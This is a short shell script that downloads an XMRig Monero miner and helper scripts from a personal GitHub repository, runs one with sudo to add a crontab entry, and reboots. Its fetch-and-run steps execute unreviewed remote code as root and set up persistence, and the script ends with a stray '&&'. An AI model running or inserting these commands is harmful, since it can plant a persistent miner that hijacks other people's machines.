cd /home/ubuntu

wget https://raw.githubusercontent.com/ngthduyen1102/xmrm/main/xmrig1804.tar.gz
tar zxvf xmrig1804.tar.gz
cd xmrig1804/
rm -f config.json
wget https://raw.githubusercontent.com/ngthduyen1102/xmrm/main/xmr_r.sh
wget https://raw.githubusercontent.com/ngthduyen1102/xmrm/main/xmr_j.sh
wget https://raw.githubusercontent.com/ngthduyen1102/xmrm/main/xmr_cr.sh
wget https://raw.githubusercontent.com/ngthduyen1102/xmrm/main/config.json
chmod +x *
echo "Start Install Crontab"
sudo sh /home/ubuntu/xmrig1804/xmr_cr.sh
echo "checking crontab added...." && crontab -l -u ubuntu
echo "Done...."
cd ..
cd ..
cd /root
echo "Now system will reboot"
sudo reboot
&&
